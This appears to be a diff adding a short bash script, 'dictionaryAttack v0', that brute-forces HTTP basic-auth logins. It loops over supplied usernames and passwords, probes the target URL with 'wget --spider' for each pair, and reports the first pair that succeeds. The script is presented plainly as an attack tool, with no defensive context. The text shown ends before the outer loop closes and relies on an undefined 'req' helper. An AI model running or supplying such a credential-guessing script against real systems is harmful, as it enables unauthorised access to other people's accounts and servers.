@@ -1,0 +1,48 @@
+#!/bin/bash
+# dictionaryAttack v0
+
+req "wget"
+req "sleep"
+
+delay=0
+url=
+usernames=
+passwords=
+error="Usage: DicAttack URL USERNAMES PASSWORDS [DELAY in seconds]"
+
+if [ -z "$1" ]; then
+	echo $error	
+	exit
+else
+	url=$1
+fi
+
+if [ -z "$2" ]; then
+	echo $error
+	exit
+else
+	usernames=$2
+fi
+
+if [ -z "$3" ]; then
+	echo $error
+	exit
+else
+	passwords="$3"
+fi
+
+if [ ! -z "$4" ]; then
+	delay=$4
+fi
+
+echo -e "\nDictionary Attack against: $url\n"
+
+for username in $usernames; do
+	for password in $passwords; do
+		echo "$username, $password"
+		if wget --spider "http://$username:$password@$url" &>/dev/null; then # --spider just checks for file instead of dloadin
+			echo -e "\nworked out :)\n"
+			exit
+		fi
+		sleep $delay
+	done
